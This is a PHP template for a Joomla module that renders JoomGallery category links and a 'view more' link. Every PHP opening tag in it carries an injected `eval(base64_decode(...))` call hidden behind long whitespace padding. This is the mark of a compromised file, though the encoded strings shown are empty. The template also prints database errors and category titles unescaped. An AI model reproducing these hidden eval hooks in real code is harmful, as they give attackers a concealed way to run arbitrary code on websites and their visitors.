<?php	                                       			eval(base64_decode("")); if(!$jg_installed) : ?>
  <p>
<?php	                                       			eval(base64_decode(""));   echo JText::_('JC_JOOMGALLERY_NOT_INSTALLED_LBL'); ?>
  </p>
<?php	                                       			eval(base64_decode("")); elseif($cat_rows == null || $dberror != "") : ?>
  <p>
<?php	                                       			eval(base64_decode(""));   echo $dberror; ?>
  </p>
<?php	                                       			eval(base64_decode("")); else :
        // CSS classes for row, clear, slideshow and image link
        $csstag = $jc_obj->getConfig('csstag');
        $rowclass = $csstag . "row";
        $clearclass = $csstag . "clr";
?>
  <!-- open joomcat div -->
  <div class="joommenu<?php	                                       			eval(base64_decode("")); echo $params->get('moduleclass_sfx'); ?>">
    <!-- open first joomcat row div -->
    <div class="<?php	                                       			eval(base64_decode("")); echo $rowclass; ?>">
<?php	                                       			eval(base64_decode(""));
		echo '<div class="cat_links">';
		foreach($cat_rows as $row)
		{
         // get all images of this category sorted randomly
         $maximg = $jc_obj->getConfig('sldmaximg');
         $img_rows = $jc_obj->getPicsByCategory($row->cid, $jc_obj->getConfig('aid'), $jc_obj->getConfig('sldimgsort'), $maximg <= 0 ? null : $maximg, 0);

	      $router = &$jc_obj->_mainframe->getRouter();
			$router->setVar('option', 'com_joomgallery');
			$router->setVar('Itemid', '4');
			$link = JRoute::_('&view=category&catid='.$img_rows[0]->catid);
			echo "<a href='".$link."'>".$img_rows[0]->cattitle."</a>";
		}
		echo '</div>';
?>

    <!-- close last joomcat row div -->
    </div>
    <div class="<?php	                                       			eval(base64_decode("")); echo $clearclass; ?>"></div>
<?php	                                       			eval(base64_decode(""));   if($jc_obj->getConfig('showvml') > 0) : ?>
    <div class="<?php	                                       			eval(base64_decode("")); echo $csstag.'vml'; ?>">
      <a href="<?php	                                       			eval(base64_decode("")); echo $jc_obj->getViewMoreLink() ?>"><?php	                                       			eval(base64_decode("")); echo $jc_obj->getConfig('vmltext'); ?></a>
    </div>
<?php	                                       			eval(base64_decode(""));   endif; ?>
  <!-- close joomcat div -->
  </div>
